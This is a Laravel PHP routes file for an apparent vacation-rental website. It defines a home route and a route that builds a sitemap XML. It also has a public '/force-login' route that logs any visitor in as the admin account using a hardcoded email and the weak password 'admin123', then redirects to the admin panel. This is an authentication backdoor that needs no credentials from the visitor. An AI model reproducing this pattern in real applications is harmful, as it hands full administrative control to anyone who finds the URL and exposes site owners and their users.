<?php

use Illuminate\Support\Facades\Route;

Route::get('/', [App\Http\Controllers\LaPalomaController::class, 'index']);

Route::get('/force-login', function (Illuminate\Http\Request $request) {
    if (Illuminate\Support\Facades\Auth::attempt(['email' => 'admin@controlcenter.com', 'password' => 'admin123'])) {
        $request->session()->regenerate();
        return redirect('/panel');
    }
    return 'Login failed';
})->middleware('web');

Route::get('/sitemap.xml', function () {
    $base = url('/');

    $urls = [
        ['loc' => $base . '/', 'priority' => '1.0', 'changefreq' => 'weekly'],
        ['loc' => $base . '/#details', 'priority' => '0.9', 'changefreq' => 'monthly'],
        ['loc' => $base . '/#amenities', 'priority' => '0.8', 'changefreq' => 'monthly'],
        ['loc' => $base . '/#gallery', 'priority' => '0.8', 'changefreq' => 'monthly'],
        ['loc' => $base . '/#video', 'priority' => '0.7', 'changefreq' => 'monthly'],
        ['loc' => $base . '/#beach', 'priority' => '0.7', 'changefreq' => 'monthly'],
        ['loc' => $base . '/#articles', 'priority' => '0.6', 'changefreq' => 'monthly'],
        ['loc' => $base . '/#contact', 'priority' => '0.6', 'changefreq' => 'monthly'],
    ];

    $xml = '<?xml version="1.0" encoding="UTF-8"?>';
    $xml .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">';

    foreach ($urls as $url) {
        $xml .= '<url>';
        $xml .= '<loc>' . htmlspecialchars($url['loc'], ENT_QUOTES, 'UTF-8') . '</loc>';
        $xml .= '<priority>' . $url['priority'] . '</priority>';
        $xml .= '<changefreq>' . $url['changefreq'] . '</changefreq>';
        $xml .= '</url>';
    }

    $xml .= '</urlset>';

    return response($xml, 200, ['Content-Type' => 'application/xml']);
});
